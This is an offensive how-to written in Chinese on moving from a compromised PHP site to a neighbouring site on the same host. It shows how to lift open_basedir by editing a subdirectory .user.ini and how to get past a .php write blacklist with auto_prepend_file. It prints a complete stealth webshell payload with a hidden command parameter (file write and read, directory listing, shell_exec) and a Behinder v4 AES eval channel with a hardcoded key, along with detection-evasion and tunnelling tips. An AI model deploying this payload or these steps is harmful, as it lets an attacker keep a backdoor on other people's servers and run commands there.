## 场景
已在同机某个站点拿到 PHP 代码执行（webshell / LFI-RCE），但 `open_basedir` 把文件操作锁在该站点目录里，够不到目标 docroot；同时主机层有 `.php` 写入黑名单（file_put_contents / rename / copy / link 写 .php 一律返回伪 ENOENT），传统"上传 .php 马"被堵死。

## 技巧一：判定 open_basedir 的真实来源
php-fpm pool 里的 `php_admin_value[open_basedir]` 与**站点目录的 `.user.ini`**（PHP_INI_PERDIR）表现相同。读这两个文件即可分辨：
```
/www/wwwroot/<site>/.user.ini        → open_basedir=/www/wwwroot/<site>/:/tmp/
/www/wwwroot/<site>/<sub>/.user.ini  → auto_prepend_file=...
```
若来自 `.user.ini`，则**按目录**生效，可控性高得多。

## 技巧二：解除目录限制（子目录 .user.ini 追加 open_basedir=/）
PHP 读取 `.user.ini` 的顺序是 docroot → 脚本目录，**越深的目录优先级越高**。若站点根 `.user.ini` 不可写（root 所有），但某个**子目录的 `.user.ini` 可写**，就在里面追加一行：
```
open_basedir=/
```
PHP 对 `.user.ini` 有 `user_ini.cache_ttl`（默认 300 秒）缓存 —— **把文件 mtime 改成 1 年前，缓存立即失效，无需等待**：
```php
$f='/www/wwwroot/<site>/<sub>/.user.ini';
$old=file_get_contents($f); file_put_contents('/tmp/userini.bak',$old);   // 先备份
file_put_contents($f, $old."\nopen_basedir=/\n");
touch($f, time()-86400*365);
echo ini_get('open_basedir');   // 下一次请求即返回 "/"
```
之后所有落在该子目录（及更深目录）的脚本都拥有全盘文件访问能力。

## 技巧三：绕过 .php 写入黑名单落马（.user.ini + auto_prepend_file）
黑名单只匹配可执行后缀（.php 等），**`.user.ini` 和 `.inc/.txt` 不在黑名单里**。于是：
1. 把载荷写到任意可写位置（`/tmp/pwn.inc`，注意 /tmp 通常在站点 open_basedir 白名单内）；
2. 在**目标站可写的子目录**（本例 `admin/`、`data/`、`require/`，owner=www）各写一份 `.user.ini`：
```
open_basedir=/www/wwwroot/<target>/:/tmp/
auto_prepend_file=/tmp/pwn.inc
```
3. 目标站该目录下的**任何 PHP 页面请求**都会先执行 `/tmp/pwn.inc` —— 全程不产生一个 `.php` 文件，对黑名单完全透明。

载荷（双通道：自控参数 + 冰蝎 v4）：
```php
<?php
if (!defined('PWN_LOADED')) { define('PWN_LOADED', 1);
  if (isset($_REQUEST['_x9f'])) {                       // 自控通道
    $c=(string)$_REQUEST['_x9f']; $t=substr($c,0,1); $a=substr($c,1);
    if ($t==='!') { $p=explode('|',$a,2); echo var_export(file_put_contents($p[0],base64_decode($p[1])),true); }
    elseif ($t==='~') echo file_get_contents($a);
    elseif ($t==='@') echo implode("\n",(array)scandir($a));
    elseif ($t==='#') echo (string)@shell_exec($a);
    else echo "ob=[".ini_get('open_basedir')."] euid=".(function_exists('posix_geteuid')?posix_geteuid():'-');
    exit;
  }
  $uri=$_SERVER['REQUEST_URI'];
  if (strpos($uri,'/beh')!==false && $_SERVER['REQUEST_METHOD']==='POST') {  // 冰蝎 v4 通道
    $key="e45e329feb5d925b"; $post=file_get_contents("php://input");
    $post = extension_loaded('openssl') ? @openssl_decrypt($post,"AES128",$key) : (($f="base64_decode")&&$f($post));
    $arr=explode('|',(string)$post);
    class C{ public function __invoke($p){ @eval($p);} }
    @call_user_func(new C(), isset($arr[1])?$arr[1]:'');
    exit;
  }
}
```
冰蝎客户端：类型 PHP，URL `https://<host>/admin/example.com/beh`，密钥 `e45e329feb5d925b`（用 URI 里带 `/beh` 作为触发条件，避免干扰站点正常请求；`example.com/beh` 走 PATH_INFO，nginx 仍把它交给 example.com，auto_prepend 先执行）。

## 验证要点
- `?_x9f=c` → 200 text/plain，能看到 `open_basedir` 是**目标站自己的**值、`cwd` 是目标站目录；
- 冰蝎通道 POST 密文 → 返回 eval 的结果；
- 若平台探测从本机发起，会因**目标站地域封锁**显示 offline，需从目标机内部（`ssl://127.0.0.1:443` + `Host:` 头）或经 socks5 隧道验证。

## 坑
- **别拿别人登记过的载荷文件路径做写入测试**：`s5.inc`（suo5 载荷）被覆盖会导致隧道握手返回测试内容而直接失效。
- `.user.ini` 里 `open_basedir` 一旦被收紧过，PHP 的 OnUpdateBaseDir 只允许继续收紧，**放宽只能靠"更深的目录"或请求初始化阶段**；改完记得伪造 mtime 绕过 user_ini 缓存。
- 目标站根目录若是 root:root 0755，chmod 也无效（非 owner），只能落到 www 所有的子目录。